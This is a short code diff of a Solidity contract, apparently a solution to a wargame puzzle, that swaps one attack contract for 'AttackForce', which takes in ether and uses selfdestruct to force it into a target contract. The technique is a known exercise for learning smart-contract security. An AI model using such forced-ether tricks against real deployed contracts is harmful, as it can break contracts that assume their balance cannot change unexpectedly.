@@ -11,9 +11,14 @@ contract Force {/*
 
 */}
 
-contract AnotherAttack {
-    // Force force;
-    function callForce(Force force) public payable returns (bool) {
-      selfdestruct(payable(address(force)));
+contract AttackForce {
+    uint balance = 0;
+
+    function transferFirst() public payable returns(uint) {
+      return balance += msg.value;
+    }
+
+    function selfDestroy(address payable addr) public payable {
+      selfdestruct(addr);
     }
 }
